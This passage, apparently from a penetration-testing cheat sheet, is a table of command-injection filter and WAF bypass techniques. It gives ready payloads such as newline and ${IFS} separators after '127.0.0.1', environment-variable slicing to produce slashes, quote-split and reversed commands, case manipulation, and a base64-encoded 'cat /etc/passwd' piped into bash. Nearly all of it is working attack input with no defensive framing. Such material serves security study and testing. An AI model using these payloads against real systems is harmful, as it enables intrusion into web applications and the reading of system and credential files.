...
|-----------------------------------|------------------------------------------------------------------------------------------------------------------------|-------------------------------------------------------|-----------------------------------------------------------------------------------------------|
| **Filter/WAF Detection**          | Detects filters or WAFs based on error messages.                                                                        | Identifying if an injection attempt is blocked.       | Inject `127.0.0.1; whoami` and look for error messages like "Invalid Input" or redirection.   |
| **Bypass Blacklisted Operators**  | Use non-blacklisted characters to bypass filters on operators like `;`, `&&`, `||`.                                     | Bypassing filters on operators like `;`.              | Test `127.0.0.1%0a` to see if newline `%0a` is accepted instead of semicolon `;`.             |
| **Bypass Blacklisted Spaces**     | Use `%0a`, `%09`, `${IFS}`, or `{}` to replace spaces and bypass blacklisting.                                          | Bypassing space filters.                              | Payload: `127.0.0.1%0a%09whoami` or `127.0.0.1%0a${IFS}whoami`.                               |
| **Bypass Blacklisted Characters** | Use environment variables or encoded values to bypass filters for characters like `/` or `\`.                          | Bypassing filters on slashes `/` and backslashes `\`.  | Linux: `127.0.0.1${LS_COLORS:10:1}${IFS}` or Windows `%HOMEPATH:~6,-7%`.                        |
| **Character Shifting**            | Shift characters using `tr` to generate characters like `\` without using them directly.                                | Bypassing character restrictions.                     | `echo $(tr '!-}' '"-~'<<<[)` shifts `[ASCII 91]` to `\`.                                      |
| **Bypass Blacklisted Commands**   | Obfuscate commands by splitting them with quotes, backslashes, or positional parameters.                                | Obfuscating commands like `whoami` or `ls`.            | `w'h'o'am'i` or `who$@ami`.                                                                   |
| **Advanced Command Obfuscation**  | Use case manipulation, reversed commands, encoded commands, or other advanced techniques to bypass advanced WAFs.       | Evading advanced filters and WAFs.                    | Case manipulation: `WHOami` -> `whoami`; Reversed command: `imaohw` for `whoami`.              |
| **Case Manipulation**             | Change the case of command characters to bypass case-sensitive filters on Linux, while Windows is case-insensitive.     | Avoid case-sensitive WAFs.                            | Linux: `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")`; Windows: `whoami` -> `WHOami`.                     |
| **Reversed Commands**             | Reverse the order of characters in a command to bypass detection.                                                      | Obfuscating common commands.                          | `echo 'whoami' | rev` or `$(rev<<<'imaohw')`.                                                   |
| **Encoded Commands**              | Base64 or other encodings to obfuscate payloads and commands.                                                          | Bypassing command filtering systems.                  | Base64: `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)` for `cat /etc/passwd`. |
| **UTF-8 to UTF-16 Encoding**      | Convert strings from UTF-8 to UTF-16 before encoding in Base64 for additional obfuscation.                              | Further obfuscating payloads using encoding schemes.   | `echo -n whoami | iconv -f utf-8 -t utf-16le | base64`.                                        |
